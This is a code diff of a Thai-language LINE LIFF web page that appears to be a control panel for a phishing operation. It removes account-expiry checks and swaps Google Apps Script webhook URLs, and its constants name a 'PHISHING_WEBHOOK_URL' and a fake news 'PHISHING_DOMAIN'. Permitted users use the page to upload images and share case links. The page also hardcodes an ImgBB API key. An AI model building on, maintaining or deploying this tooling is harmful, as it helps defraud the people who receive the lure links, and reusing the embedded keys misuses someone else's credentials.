@@ -190,25 +190,6 @@
             font-size: 14px;
             color: var(--text-light);
         }
-        
-        /* เพิ่ม style สำหรับการแสดงวันหมดอายุ */
-        .expiry-date {
-            margin-top: 5px;
-            font-size: 12px;
-            color: var(--text-light);
-            padding-left: 20px;
-        }
-        
-        .expiry-date.expired {
-            color: var(--error-color);
-            font-weight: 500;
-        }
-        
-        .badge.expired {
-            background-color: rgba(255, 82, 82, 0.15);
-            color: var (--error-color);
-            border: 1px solid rgba(255, 82, 82, 0.3);
-        }
 
         .badge {
             display: inline-block;
@@ -548,7 +529,7 @@
         /* Tips Box */
         .tips {
             background-color: rgba(88, 136, 231, 0.08);
-            border-radius: var (--border-radius);
+            border-radius: var(--border-radius);
             padding: 15px 20px;
             margin: 25px 0;
             position: relative;
@@ -686,10 +667,6 @@
                             <span><i class="fas fa-circle-info"></i> สถานะ:</span> <span id="userStatus">ตรวจสอบสิทธิ์...</span>
                             <span id="statusBadge" class="badge">รอตรวจสอบ</span>
                         </div>
-                        <!-- เพิ่มส่วนแสดงวันหมดอายุ -->
-                        <div id="expiryDateDisplay" class="expiry-date" style="display: none;">
-                            <i class="fas fa-clock"></i> วันหมดอายุ: <span id="expiryDateText">-</span>
-                        </div>
                     </div>
                 </div>
             </div>
@@ -758,18 +735,14 @@
         let isLiffInitialized = false;
         let userHasPermission = false;
         
-        // ตัวแปรใหม่สำหรับเก็บข้อมูลวันหมดอายุ
-        let userExpiryDate = null;
-        let isUserExpired = false;
-        
         // ค่า Config สำคัญ
         const LIFF_ID = '2007231851-0DqwXxQg';
         const IMGBB_API_KEY = '0854e4f08da46fb35f126bdf17984657';
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxjzBd2zWscFNnRuUJu9Pi9qz9rFvLyh5cfNrstHcwYSq-Ofx-XDB94i4yot9B3E0Xw/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxjzBd2zWscFNnRuUJu9Pi9qz9rFvLyh5cfNrstHcwYSq-Ofx-XDB94i4yot9B3E0Xw/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -852,18 +825,13 @@
                 try {
                     const savedPermission = localStorage.getItem('user_permission_' + userId);
                     const savedTime = parseInt(localStorage.getItem('user_permission_time_' + userId) || '0');
-                    const savedExpiryDate = localStorage.getItem('user_expiry_date_' + userId);
-                    const savedIsExpired = localStorage.getItem('user_is_expired_' + userId) === 'true';
                     const currentTime = new Date().getTime();
                     
                     // ถ้าข้อมูลไม่เกิน 15 นาที ให้ใช้ค่าจาก localStorage (ลดจาก 30 นาที เหลือ 15 นาที)
-                    if (savedPermission && savedExpiryDate !== null && (currentTime - savedTime < 15 * 60 * 1000)) {
+                    if (savedPermission && (currentTime - savedTime < 15 * 60 * 1000)) {
                         console.log("ใช้ข้อมูลสิทธิ์จาก localStorage");
-                        userExpiryDate = savedExpiryDate;
-                        isUserExpired = savedIsExpired;
-                        displayExpiryDate(userExpiryDate, isUserExpired);
                         statusEl.textContent = originalText;
-                        return savedPermission === 'true' && !savedIsExpired;
+                        return resolve(savedPermission === 'true');
                     }
                 } catch (e) {
                     console.error('ไม่สามารถอ่านข้อมูลจาก localStorage:', e);
@@ -882,15 +850,6 @@
                         if (data && typeof data === 'object') {
                             console.log("สถานะสิทธิ์จาก API:", data.hasPermission);
                             console.log("ข้อความสถานะจาก API:", data.userStatus || "ไม่ได้ระบุ");
-                            console.log("วันหมดอายุจาก API:", data.expiryDate || "ไม่ได้ระบุ");
-                            console.log("สถานะหมดอายุ:", data.isExpired ? "หมดอายุแล้ว" : "ยังไม่หมดอายุ");
-                            
-                            // บันทึกข้อมูลวันหมดอายุ
-                            userExpiryDate = data.expiryDate || null;
-                            isUserExpired = !!data.isExpired;
-                            
-                            // แสดงวันหมดอายุบน UI
-                            displayExpiryDate(userExpiryDate, isUserExpired);
                             
                             // บันทึกสิทธิ์ใน localStorage
                             try {
@@ -900,9 +859,6 @@
                                 if (data.userStatus) {
                                     localStorage.setItem('user_status_' + userId, data.userStatus);
                                 }
-                                // บันทึกข้อมูลวันหมดอายุ
-                                localStorage.setItem('user_expiry_date_' + userId, userExpiryDate || '');
-                                localStorage.setItem('user_is_expired_' + userId, isUserExpired ? 'true' : 'false');
                             } catch (e) {
                                 console.error('ไม่สามารถบันทึกข้อมูลใน localStorage:', e);
                             }
@@ -910,7 +866,7 @@
                             if (data.hasPermission !== undefined) {
                                 // คืนค่าข้อความเดิม
                                 statusEl.textContent = originalText;
-                                resolve(data.hasPermission === true && !isUserExpired);
+                                resolve(data.hasPermission === true);
                             } else {
                                 console.log("ข้อมูลสิทธิ์ไม่สมบูรณ์, ใช้การตรวจสอบสำรอง");
                                 statusEl.textContent = originalText;
@@ -1028,20 +984,6 @@
         
         // เปิดใช้งานฟอร์ม
         function enableForm() {
-            // ไม่อนุญาตให้ใช้งานหากบัญชีหมดอายุ
-            if (isUserExpired) {
-                document.getElementById('caseName').disabled = true;
-                document.getElementById('selectImageBtn').disabled = true;
-                document.getElementById('shareBtn').disabled = true;
-                
-                // แสดงข้อความแจ้งเตือนการหมดอายุ
-                const permissionMessage = document.getElementById('permissionMessage');
-                permissionMessage.innerHTML = '<p>บัญชีของคุณหมดอายุการใช้งาน กรุณาติดต่อผู้ดูแลระบบเพื่อต่ออายุการใช้งาน</p>';
-                permissionMessage.style.display = 'block';
-                
-                return;
-            }
-            
             document.getElementById('caseName').disabled = false;
             document.getElementById('selectImageBtn').disabled = false;
             checkCanShare();
@@ -1599,31 +1541,6 @@
         // สร้าง ID เฉพาะสำหรับการส่งข้อมูล
         function generateUniqueId() {
             return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
-        }
-        
-        // ฟังก์ชันใหม่สำหรับแสดงวันหมดอายุ
-        function displayExpiryDate(expiryDate, isExpired) {
-            const expiryEl = document.getElementById('expiryDateDisplay');
-            const expiryTextEl = document.getElementById('expiryDateText');
-            const statusBadge = document.getElementById('statusBadge');
-            
-            if (expiryDate) {
-                expiryTextEl.textContent = expiryDate;
-                expiryEl.style.display = 'block';
-                
-                if (isExpired) {
-                    expiryEl.classList.add('expired');
-                    // อัปเดตแบดจ์สถานะเป็นหมดอายุ
-                    if (statusBadge) {
-                        statusBadge.textContent = 'หมดอายุ';
-                        statusBadge.className = 'badge expired';
-                    }
-                } else {
-                    expiryEl.classList.remove('expired');
-                }
-            } else {
-                expiryEl.style.display = 'none';
-            }
         }
     </script>
 </body>
